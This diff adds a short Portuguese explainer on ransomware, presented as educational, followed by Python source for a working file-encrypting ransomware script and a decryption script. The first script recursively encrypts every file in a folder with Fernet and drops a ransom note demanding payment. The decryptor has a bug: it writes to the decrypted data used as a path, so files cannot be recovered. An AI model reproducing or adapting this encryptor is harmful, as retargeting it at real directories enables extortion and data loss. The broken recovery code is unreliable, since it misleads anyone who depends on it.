@@ -1,0 +1,96 @@
+O QUE UM RANSOMWARE FAZ?
+Ransom nada mais é que sequestro, só que virtual e sequestrando arquivos.
+Softwares do tipo ransomware vasculham seu computador atrás de arquivos importantes e de valor, e os encriptam de uma maneira que fiquem ilegíveis.
+Dessa maneira os atacantes conseguem controle sobre a vítima e pedem valores altíssimos para o resgate, que é feito com a liberação de uma chave que permite a vítima desencriptar os arquivos sequestrados.
+
+!! Vale lembrar denovo que esse código foi desenvolvido apenas para fins educacionais, e é apenas um exemplo bem simples.
+
+Código para roubar e encriptar arquivos:
+
+from cryptography.fernet import Fernet
+import os
+
+#gerar chave de criptografia e salvar
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key","wb") as chave_file:
+        chave_file.write(chave)
+
+#carregar chave salva
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+#criptografar um unico arquivo
+def criptografar_arquivo(arquivo, chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_encriptados = f.encrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_encriptados)
+
+#encontrar arquivos para criptografar
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+# Cria e envia uma mensagem informando a vítima do golpe e exigindo resgate para a liberação dos arquivos
+def criar_mensagem_resgate():
+    with open("READ ME.txt", "w") as f:
+        f.write("Se esta lendo isso, seus dados foram criptografados.\n")
+        f.write("Envie o valor de X e o comprovante de pagamento.\n")
+
+#main
+def main():
+    gerar_chave()
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        criptografar_arquivo(arquivo,chave)
+    criar_mensagem_resgate()
+    print("Ransomware executado.")
+
+if __name__ == "__main__":
+    main()
+
+###########**********
+Código para desencriptar:
+###########*********
+
+from cryptography.fernet import Fernet
+import os
+
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+def descriptografar_arquivo(arquivo,chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+        dados_descriptografados = f.decrypt(dados)
+    with open(dados, "wb") as file:
+        file.write(dados_descriptografados)
+
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        descriptografar_arquivo(arquivo,chave)
+    print("arquivo descriptografados com suqsesso")
+
+if __name__ == "__main__":
+    main()
